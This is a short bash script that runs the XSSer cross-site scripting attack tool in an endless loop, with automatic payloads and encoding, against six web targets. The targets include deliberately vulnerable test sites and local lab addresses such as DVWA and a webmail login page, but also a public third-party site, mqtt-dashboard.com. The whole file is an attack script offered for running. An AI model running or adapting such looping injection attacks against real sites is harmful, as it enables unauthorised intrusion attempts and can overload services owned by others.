#!/bin/bash

while :
do
	python2 xsser -u "http://testphp.vulnweb.com" --auto --Cem "Hex,Str,Hex" --user-agent "hacking" --timeout "20" --threads "5" 
	python2 xsser -u "http://www.mqtt-dashboard.com" --auto --Cem "Hex,Str,Hex" --user-agent "hacking" --timeout "20" --threads "5" 
	python2 xsser -u "https://192.168.1.184/index.jsp" --auto --Cem "Hex,Str,Hex" --user-agent "hacking" --timeout "20" --threads "5" 
	python2 xsser -u "http://192.168.1.195/dvwa/vulnerabilities/sqli/" --auto --Cem "Hex,Str,Hex" --user-agent "hacking" --timeout "20" --threads "5" 
	python2 xsser -u "http://192.168.1.152/" --auto --Cem "Hex,Str,Hex" --user-agent "hacking" --timeout "20" --threads "5" 
	python2 xsser -u "http://192.168.1.190/webmail/src/login.php" --auto --Cem "Hex,Str,Hex" --user-agent "hacking" --timeout "20" --threads "5" 

done





